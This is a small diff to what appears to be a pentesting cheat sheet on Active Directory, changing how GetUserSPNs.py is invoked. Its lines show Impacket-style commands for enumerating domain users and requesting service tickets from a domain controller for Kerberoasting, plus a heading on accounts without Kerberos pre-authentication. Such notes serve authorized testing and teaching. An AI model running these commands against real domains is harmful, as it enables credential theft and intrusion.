@@ -17,13 +17,13 @@ python3 GetADUsers.py -all -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
 #### with a ticket
 
 ```csharp
-GetUserSPNs.py -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
+./GetUserSPNs.py -k -no-pass -dc-ip <DC_IP> Domain.local/Administrator
 ```
 
 #### with a password
 
 ```csharp
-GetUserSPNs.py -request -dc-ip <DC_IP> Domain.local/Administrator
+./GetUserSPNs.py -request -dc-ip <DC_IP> Domain.local/Administrator
 ```
 
 ### Account witch doesn't require Kerberos Authentication
